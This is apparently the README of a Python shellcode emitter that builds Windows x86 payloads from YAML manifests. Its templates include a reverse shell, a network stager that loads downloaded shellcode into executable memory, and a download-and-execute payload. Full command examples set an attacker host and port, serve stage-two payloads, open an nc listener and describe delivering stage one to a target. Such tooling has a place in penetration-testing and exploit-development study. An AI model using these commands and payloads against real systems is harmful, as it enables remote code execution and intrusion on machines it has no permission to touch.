# Shellcode Emitter

A Python toolkit that takes a YAML manifest describing what your shellcode needs
(APIs, strings, badchars) and produces:

- `emitter_out/asm/generated.asm` — full x86 assembly (PEB walk + API resolution + payload)
- `emitter_out/Documentation/contract.md` — stack layout map and API reference
- `emitter_out/bin/shellcode.{bin,hex,py,c}` — assembled output in multiple formats (requires keystone or nasm)

---

## Prerequisites

```bash
# Run from repo root
uv run -m Tools.emitter --help

# Optional — enables binary assembly output
pip install keystone-engine
# or: install nasm and add to PATH
```

---

## Quick start

```bash
uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
    --template reverse_shell \
    --lhost 192.168.1.10 --lport 4444 \
    --out emitter_out/
```

Outputs:
```
[+] Generated: emitter_out/asm/generated.asm
[+] Contract:  emitter_out/Documentation/contract.md
[+] Assembler: keystone
[+] Shellcode: 512 bytes
[+] Hex:       emitter_out/bin/shellcode.{bin,hex,py,c}
```

---

## CLI reference

```
uv run -m Tools.emitter <manifest> [options]

Arguments:
  manifest              Path to YAML manifest file

Options:
  --template NAME       Payload template to use (see Templates section)
  --out DIR             Output directory (default: emitter_out)
  --lhost IP            Attacker IP (reverse shell / download templates)
  --lport PORT          Attacker port
  --command CMD         Command to run (run_command template, default: cmd.exe)
  --src PATH            Source file path (copy_file / copy_then_run)
  --dst PATH            Destination file path (tcp_download / copy_then_run)
  --no-assemble         Skip binary assembly, emit .asm only
```

---

## Manifest format

Manifests are YAML files that declare everything the shellcode needs.

```yaml
# badchars: bytes that will be mangled in transit
badchars: ["00", "0a", "0d"]

# functions: Win32 APIs to resolve (must be in api_database.py)
functions:
  - LoadLibraryA
  - WSAStartup
  - WSASocketA
  - connect

# variables: named 4-byte stack slots for runtime values (handles, pointers, etc.)
variables:
  - socket_handle

# strings: data to construct on the stack frame
strings:
  - label: cmd          # referenced by templates as layout.slot("cmd")
    value: cmd.exe
    method: mov         # mov | shiftor | xor | push
    dest: edi           # destination register (default: edi)
```

### String methods

| Method | Description |
|---|---|
| `mov` | DWORD-at-a-time writes via `mov [edi+N], eax` |
| `shiftor` | Build each DWORD via shift+or (avoids certain byte patterns) |
| `xor` | XOR-encode each DWORD against a mask |
| `push` | Push DWORDs onto the stack; ESP points to the string after |

All methods avoid badchar bytes in the instruction encoding automatically.

---

## Templates

### `reverse_shell`
Connects back to `--lhost:--lport` and spawns `cmd.exe` with stdio redirected to the socket.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
    --template reverse_shell --lhost 192.168.1.10 --lport 4444 \
    --out emitter_out/
```

Required manifest functions: `LoadLibraryA`, `WSAStartup`, `WSASocketA`, `connect`, `CreateProcessA`  
Required variables: `socket_handle`  
Required strings: `cmd`

---

### `run_command`
Executes a command via `WinExec`. Uses the `cmd` string slot if present; falls back to inline push.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/calc.yaml \
    --template run_command --command calc.exe \
    --out emitter_out/
```

Required functions: `WinExec`

---

### `copy_file`
Copies one file to another location via `CopyFileA`.

Required functions: `CopyFileA`  
Required strings: `src_path`, `dst_path`

---

### `copy_then_run`
Copies a file to `--dst` then executes it via `WinExec`. The destination path serves as both the copy target and the command line.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/copy_then_run.yaml \
    --template copy_then_run \
    --src "C:\\tools\\payload.exe" \
    --dst "C:\\Windows\\Temp\\payload.exe" \
    --out emitter_out/
```

Required functions: `CopyFileA`, `WinExec`  
Required strings: `src_path`, `dst_path`

---

### `tcp_download`
Connects to `--lhost:--lport`, receives a file using the staging protocol, writes it to
`--dst`, then executes it via `WinExec`. Never produces an executable stage — the file
lands on disk.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/tcp_download.yaml \
    --template tcp_download \
    --lhost 192.168.1.10 --lport 9002 \
    --dst "C:\\Windows\\Temp\\payload.exe" \
    --out emitter_out/
```

Required functions: `LoadLibraryA`, `WSAStartup`, `WSASocketA`, `connect`, `recv`,
`closesocket`, `VirtualAlloc`, `CreateFileA`, `WriteFile`, `CloseHandle`, `WinExec`  
Required variables: `socket_handle`, `file_handle`, `virt_buf`, `bytes_total`, `bytes_recvd`  
Required strings: `dst_path`

Serve the file with `tcp_stage_server.py` (see Staging Server section below).

---

### `tcp_stager`
Stage 1 of a multi-stage chain. Connects to `--lhost:--lport`, downloads raw shellcode
bytes into executable memory (`VirtualAlloc` with `PAGE_EXECUTE_READWRITE`), then
transfers control. Never touches disk.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
    --template tcp_stager \
    --lhost 192.168.1.10 --lport 9002 \
    --out emitter_out/stage1/
```

Required functions: `LoadLibraryA`, `WSAStartup`, `WSASocketA`, `connect`, `recv`,
`closesocket`, `VirtualAlloc`  
Required variables: `socket_handle`, `virt_buf`, `bytes_total`, `bytes_recvd`

Stage 2 is a separate emitter build (any template) assembled to `.bin` and served
by `tcp_stage_server.py`.

---

### `bind_shell` (scaffold)
Partial implementation — `WSAStartup` and `WSASocketA` are generated; `bind` / `listen` /
`accept` stubs are marked TODO. Complete manually.

---

## Stack layout

The emitter allocates a fixed frame with `mov ebp, esp` / `add esp, 0xfffffb00`
(0x500 bytes reserved). Slots are assigned in strict zones:

| Zone | Offsets | Contents |
|---|---|---|
| Export context | `[ebp-0x04]` – `[ebp-0x18]` | PEB walk internals — **do not allocate here** |
| Module bases | `[ebp-0x20]` + | One 4-byte slot per required DLL, in `MODULE_LOAD_ORDER` sequence |
| API pointers | After module bases | One 4-byte slot per function, in manifest declaration order |
| Variables | After API pointers | One 4-byte slot per variable, in manifest declaration order |
| Structures | `[ebp-0x80]` + | Hard-start at 0x80; structs in first-seen order via `requires_structs` |
| Strings | After structures | 4-byte aligned; strings in manifest declaration order |

The generated `contract.md` shows the exact offset for every slot in a given build.

---

## Staging protocol

All network templates that receive data use the same wire protocol:

```
[4 bytes, little-endian uint32]   payload size
[payload_size bytes]              raw payload
```

For `tcp_stager`: payload is raw shellcode bytes.  
For `tcp_download`: payload is the raw file to write to disk.

---

## Staging server

`Tools/tcp_stage_server.py` serves any file using the staging protocol above.

```bash
# Serve stage 2 shellcode on port 9002
python Tools/tcp_stage_server.py --port 9002 --file emitter_out/stage2/bin/shellcode.bin

# Serve a file for tcp_download on port 9003
python Tools/tcp_stage_server.py --port 9003 --file payload.exe
```

The server loops — each new connection gets a fresh copy of the file. Stop with Ctrl-C.

### Two-stage chain example

```bash
# Build stage 1 — stager connecting to port 9002
uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
    --template tcp_stager --lhost 192.168.1.10 --lport 9002 \
    --out emitter_out/stage1/

# Build stage 2 — reverse shell connecting back on port 4444
uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
    --template reverse_shell --lhost 192.168.1.10 --lport 4444 \
    --out emitter_out/stage2/

# Serve stage 2 (stage 1 fetches it at runtime)
python Tools/tcp_stage_server.py --port 9002 --file emitter_out/stage2/bin/shellcode.bin

# Start listener for stage 2 reverse shell
nc -lvp 4444

# Deliver stage 1 shellcode to target
```

---

## Badchar safety

All string construction avoids badchar bytes automatically. For immediate values in
payload templates (IP addresses, ports, constants like `MAKEWORD(2,2)`), the emitter
uses `encode.py` helpers that compute a per-byte XOR mask:

```asm
; IP 192.168.1.0 — last byte 0x00 is a badchar
mov  eax, 0xc1a902XX     ; encoded (no badchars)
xor  eax, 0x01010101     ; mask (no badchars) → eax = 0xc0a80100
mov  dword ptr [edi+0x04], eax
```

The manifest `badchars` list is authoritative — it flows through to all encoding
decisions automatically.

---

## Verification checklist

```bash
# 1. Tests
uv run pytest Tools/emitter/tests/ -q
# Expect: 175 passed, 1 skipped

# 2. Each template builds
uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
    --template reverse_shell --lhost 192.168.1.10 --lport 4444 --out emitter_out/
uv run -m Tools.emitter Tools/emitter/manifests/copy_then_run.yaml \
    --template copy_then_run --out emitter_out/
uv run -m Tools.emitter Tools/emitter/manifests/tcp_download.yaml \
    --template tcp_download --lhost 192.168.1.10 --lport 9002 \
    --dst "C:\\Windows\\Temp\\p.exe" --out emitter_out/
uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
    --template tcp_stager --lhost 192.168.1.10 --lport 9002 --out emitter_out/stage1/
# Expect: [+] Generated + [+] Contract for each

# 3. Stage server round-trip
python Tools/tcp_stage_server.py --port 9999 \
    --file emitter_out/stage1/asm/generated.asm &
python -c "
import socket, struct
s = socket.socket()
s.connect(('127.0.0.1', 9999))
n = struct.unpack('<I', s.recv(4))[0]
d = s.recv(n)
print('OK' if len(d) == n else 'MISMATCH', f'{len(d)} bytes')
s.close()
"
kill %1
# Expect: OK N bytes

# 4. Scan generated assembly for badchar bytes in immediates
for f in emitter_out/*/asm/generated.asm emitter_out/stage1/asm/generated.asm; do
    echo "=== $f ==="
    grep -E "^\s+(mov|xor)\s" "$f" \
        | grep -E "0x[0-9a-f]*(00|0a|0d)[0-9a-f]*\b" || echo "  CLEAN"
done
# Expect: CLEAN for each file
```

---

## Adding a new API

1. Add an `APIRecord` entry to `API_DATABASE` in `Tools/emitter/api_database.py`
2. If the API requires a struct, add a `StructRecord` to `STRUCT_DATABASE`
3. If the API is from a new DLL, add a `ModuleInfo` entry to `MODULE_LOAD_ORDER`
4. Add the function name to the relevant manifest's `functions` list
5. Run the test suite to confirm nothing broke

## Adding a new template

1. Create `Tools/emitter/payload_templates/your_template.py` extending `PayloadTemplate`
2. Declare `REQUIRED_FUNCTIONS` and `REQUIRED_VARIABLES`
3. Implement `emit(self, layout, config)` — use `layout.slot(name).ebp_ref` for all stack references, never hardcode offsets
4. Use `encode_dword` / `encode_word` / `safe_push_*` from `..encode` for any multi-byte immediate value
5. Register the template in `_load_template()` and the `--template` choices list in `build.py`
6. Add a manifest under `Tools/emitter/manifests/`
